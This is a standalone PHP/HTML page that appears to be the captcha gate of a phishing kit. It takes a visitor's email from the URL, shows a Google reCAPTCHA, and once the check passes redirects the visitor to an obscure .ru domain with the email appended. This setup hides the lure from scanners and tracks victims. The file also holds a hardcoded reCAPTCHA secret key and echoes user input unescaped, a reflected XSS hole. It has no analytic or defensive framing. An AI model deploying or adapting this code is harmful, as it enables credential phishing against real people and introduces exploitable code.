<html>
  <head>
    <title>Verify reCaptcha</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  </head>
  <body>
      <center>
        <form id="form" action="dont.php" method="POST">
            <h3>Please verify you are not a robot and click continue</h3>
          <div style="margin-top:15%" data-callback="recaptchacallback" class="g-recaptcha" data-sitekey="6LfUaI8iAAAAABKfQ8zifhobVFmjSA4CyqXemaAk"></div>
          <input type="hidden" id="email" name="email" value="<?php echo $_GET['email']; ?>" >
          <br/>
        </form>
    </center>
  </body>
</html>

<script>
    function recaptchacallback(){
        document.getElementById('form').submit();
    }
</script>

<?php
    $email = $_POST['email'];
    $url = "https://online-0tnrbpzn.adecs.ru/$";
    $secretkey= "6LfUaI8iAAAAADuVzUMOfVXF09wBYbmKcD8zl_dQ";

    function curl($URL){
        $c = curl_init();
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_URL, $URL);
        $contents = curl_exec($c);
        curl_close($c);
        if ($contents) return $contents;
        else return FALSE;
    }

    if($_SERVER["REQUEST_METHOD"] == "POST"){
            $api_response = curl("https://www.google.com/recaptcha/api/siteverify?secret=".$secretkey."&response=".$_POST['g-recaptcha-response']);
            $api_response = json_decode($api_response, true);
            
            if($api_response["success"] == true){
                echo "<script>location.href='$url$email'; </script>";
            }else{
            
                echo "<script> window.location.reload</script>";
            }
    }
?>